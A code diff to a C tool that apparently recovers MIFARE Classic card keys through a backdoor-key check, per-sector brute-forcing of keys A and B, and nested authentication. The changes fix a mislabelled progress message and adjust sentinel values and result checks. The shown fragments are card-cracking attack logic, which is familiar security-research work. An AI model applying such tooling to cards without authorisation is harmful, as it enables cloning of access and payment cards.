@@ -324,7 +324,7 @@ int main(
     // Anticollision to send raw frames
     mf_select_target();
 
-    uint64_t backdoor_key = -1;
+    uint64_t backdoor_key = ~0;
 
     for (size_t i = 0; i < backdoor_keys_len; i++)
     {
@@ -346,7 +346,7 @@ int main(
     fprintf(stdout, "\n\n");
     free(backdoor_keys);
 
-    if (backdoor_key == -1)
+    if (backdoor_key == ~0)
     {
         fprintf(stdout, "Card is not vulnerable to backdoor attack, or has no known key...\n\n");
         goto dump_card;
@@ -470,15 +470,14 @@ int main(
 
         if (!sectors[s].found_key_a)
         {
-            uint16_t seed_b = compute_seednt16_nt32(sectors[s].nt_b, sectors[s].key_b);
             for (size_t l = 0, i = 0; i < recovery_keys_a_len; i++)
             {
                 uint64_t key = recovery_keys_a[i];
                 uint16_t seed = key >> 48;
 
                 if (sectors[s].found_key_b ?
-                    (seed == seed_b) :
-                    (lfsr16_common[seed] & 0b01))
+                    seed == compute_seednt16_nt32(sectors[s].nt_b, sectors[s].key_b) :
+                    lfsr16_common[seed] & 0b01)
                 {
                     recovery_keys_a[i] = recovery_keys_a[l];
                     recovery_keys_a[l++] = key;
@@ -524,15 +523,14 @@ int main(
 
         if (!sectors[s].found_key_b)
         {
-            uint16_t seed_a = compute_seednt16_nt32(sectors[s].nt_a, sectors[s].key_a);
             for (size_t l = 0, i = 0; i < recovery_keys_b_len; i++)
             {
                 uint64_t key = recovery_keys_b[i];
                 uint16_t seed = key >> 48;
 
                 if (sectors[s].found_key_a ?
-                    (seed == seed_a) :
-                    (lfsr16_common[seed] & 0b10))
+                    seed == compute_seednt16_nt32(sectors[s].nt_a, sectors[s].key_a) :
+                    lfsr16_common[seed] & 0b10)
                 {
                     recovery_keys_b[i] = recovery_keys_b[l];
                     recovery_keys_b[l++] = key;
@@ -541,7 +539,7 @@ int main(
 
             for (size_t i = 0; i < recovery_keys_b_len; i++)
             {
-                fprintf(stdout, "\rBruteforcing sector %02d, key A (%10zu / %zu) ", s, i + 1, recovery_keys_b_len);
+                fprintf(stdout, "\rBruteforcing sector %02d, key B (%10zu / %zu) ", s, i + 1, recovery_keys_b_len);
                 fflush(stdout);
 
                 if (mf_auth(MC_AUTH_B, sector_to_trailer(s), recovery_keys_b[i], auth_uid))
@@ -972,7 +970,7 @@ bool mf_nested_auth(
     }
 
     res = nfc_initiator_transceive_bits(pdi, abt_cmd, 32, abt_cmd_par, abt_res, sizeof(abt_res), abt_res_par);
-    if (res < 0)
+    if (res != 32)
     {
         nfc_perror(pdi, "Error while requesting encrypted tag-nonce");
         exit(EXIT_FAILURE);
